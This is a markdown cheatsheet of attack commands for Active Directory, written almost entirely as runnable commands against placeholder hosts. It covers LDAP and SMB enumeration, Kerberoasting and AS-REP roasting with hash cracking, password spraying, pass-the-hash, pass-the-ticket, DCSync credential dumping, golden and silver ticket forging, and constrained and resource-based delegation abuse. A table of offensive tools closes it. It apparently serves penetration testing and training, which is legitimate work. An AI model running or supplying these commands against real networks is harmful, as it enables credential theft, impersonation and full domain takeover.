# Active Directory Exploitation Cheatsheet

## 🔍 Enumeration

### BloodHound Collection
```powershell
# SharpHound
.\SharpHound.exe -c All --zipfilename output.zip

# Python (from Linux)
bloodhound-python -u user -p 'password' -d domain.local -ns 10.10.10.1 -c All
```

### LDAP Enumeration
```bash
# Anonymous bind
ldapsearch -x -H ldap://10.10.10.1 -b "DC=domain,DC=local"

# Authenticated
ldapsearch -x -H ldap://10.10.10.1 -D "user@domain.local" -w 'password' -b "DC=domain,DC=local"

# Find users
ldapsearch -x -H ldap://10.10.10.1 -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
```

### SMB Enumeration
```bash
# List shares
smbclient -L //10.10.10.1 -U 'user%password'
crackmapexec smb 10.10.10.1 -u user -p password --shares

# Spider shares
crackmapexec smb 10.10.10.1 -u user -p password -M spider_plus
```

## 🔑 Credential Attacks

### Kerberoasting
```bash
# Impacket
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1 -request -outputfile hashes.txt

# Crack
hashcat -m 13100 hashes.txt wordlist.txt
john --wordlist=wordlist.txt hashes.txt
```

### AS-REP Roasting
```bash
# Find users without preauth
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1 -outputfile asrep.txt

# Crack
hashcat -m 18200 asrep.txt wordlist.txt
```

### Password Spraying
```bash
# Careful with lockout!
crackmapexec smb 10.10.10.1 -u users.txt -p 'Summer2024!' --continue-on-success
kerbrute passwordspray -d domain.local users.txt 'Summer2024!'
```

## 🎭 Lateral Movement

### Pass-the-Hash
```bash
# Impacket
psexec.py -hashes :NTHASH domain.local/administrator@10.10.10.1
wmiexec.py -hashes :NTHASH domain.local/administrator@10.10.10.1
evil-winrm -i 10.10.10.1 -u administrator -H NTHASH
```

### Pass-the-Ticket
```bash
# Export ticket
export KRB5CCNAME=ticket.ccache

# Use ticket
psexec.py -k -no-pass domain.local/administrator@dc.domain.local
```

### Overpass-the-Hash
```bash
# Get TGT with NTLM hash
getTGT.py domain.local/user -hashes :NTHASH
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass domain.local/user@target.domain.local
```

## 👑 Privilege Escalation

### DCSync Attack
```bash
# Requires: Replicating Directory Changes permissions
secretsdump.py domain.local/admin:'password'@10.10.10.1 -just-dc-ntlm
```

### Golden Ticket
```bash
# Dump krbtgt hash first
secretsdump.py domain.local/admin:'password'@10.10.10.1 -just-dc-user krbtgt

# Forge ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local administrator
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@dc.domain.local
```

### Silver Ticket
```bash
# Service account hash + SPN
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-xxx -domain domain.local -spn MSSQLSvc/sql.domain.local:1433 administrator
```

## 🔓 Delegation Attacks

### Unconstrained Delegation
```bash
# Find computers with unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# Coerce auth and capture TGT
# Use Rubeus/Mimikatz to monitor for incoming tickets
```

### Constrained Delegation
```bash
# Find accounts with constrained delegation
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

# S4U attack
getST.py -spn MSSQLSvc/sql.domain.local -impersonate Administrator domain.local/svc_account:password
```

### Resource-Based Constrained Delegation (RBCD)
```bash
# If you can write to msDS-AllowedToActOnBehalfOfOtherIdentity
# 1. Create computer account
addcomputer.py domain.local/user:password -computer-name FAKE$ -computer-pass 'Pass123!'

# 2. Set RBCD
rbcd.py -delegate-to TARGET$ -delegate-from FAKE$ -dc-ip 10.10.10.1 domain.local/user:password -action write

# 3. Get service ticket
getST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/FAKE$:'Pass123!'
```

## 🛠 Tools Reference
| Tool | Purpose |
|------|---------|
| [Impacket](https://github.com/SecureAuthCorp/impacket) | Python AD tools |
| [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) | Swiss army knife |
| [BloodHound](https://github.com/BloodHoundAD/BloodHound) | AD path analysis |
| [Rubeus](https://github.com/GhostPack/Rubeus) | Kerberos abuse |
| [Mimikatz](https://github.com/gentilkiwi/mimikatz) | Credential extraction |
| [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) | WinRM shell |
| [Kerbrute](https://github.com/ropnop/kerbrute) | Kerberos brute force |
